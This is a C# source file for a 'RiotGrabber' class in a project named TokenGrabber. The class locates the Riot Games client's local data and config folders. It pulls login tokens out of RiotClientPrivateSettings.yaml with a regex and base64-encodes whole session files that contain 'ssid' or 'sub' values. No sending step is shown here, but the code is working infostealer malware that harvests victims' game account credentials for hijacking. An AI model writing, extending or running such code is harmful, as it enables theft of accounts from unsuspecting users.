namespace TokenGrabber.Grabbers;

using System.Text.RegularExpressions;
using TokenGrabber.Models;

internal sealed partial class RiotGrabber : ITokenGrabber
{
    private static readonly string RiotDataPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Riot Games", "Riot Client", "Data");

    private static readonly string RiotConfigPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Riot Games", "Riot Client", "Config");

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        ExtractFromPrivateSettings(tokens);
        ExtractFromSessionFiles(tokens);

        return tokens;
    }

    private static void ExtractFromPrivateSettings(List<GrabbedToken> tokens)
    {
        var settingsPath = Path.Combine(RiotDataPath, "RiotClientPrivateSettings.yaml");
        if (!File.Exists(settingsPath)) return;

        var content = File.ReadAllText(settingsPath);
        var matches = RiotTokenRegex().Matches(content);

        foreach (Match match in matches)
        {
            tokens.Add(new GrabbedToken
            {
                Token = match.Groups[1].Value,
                Platform = "RiotGames",
                Source = "RiotClientPrivateSettings.yaml",
                ExtractedAt = DateTime.UtcNow
            });
        }
    }

    private static void ExtractFromSessionFiles(List<GrabbedToken> tokens)
    {
        if (!Directory.Exists(RiotConfigPath)) return;

        var sessionFiles = Directory.GetFiles(RiotConfigPath, "*.yaml");
        foreach (var file in sessionFiles)
        {
            var content = File.ReadAllText(file);
            if (content.Contains("ssid") || content.Contains("sub"))
            {
                tokens.Add(new GrabbedToken
                {
                    Token = Convert.ToBase64String(File.ReadAllBytes(file)),
                    Platform = "RiotGames",
                    Source = Path.GetFileName(file),
                    ExtractedAt = DateTime.UtcNow
                });
            }
        }
    }

    [GeneratedRegex(@"riot-login:\s*""?([A-Za-z0-9_\-\.]+)""?", RegexOptions.Compiled)]
    private static partial Regex RiotTokenRegex();
}
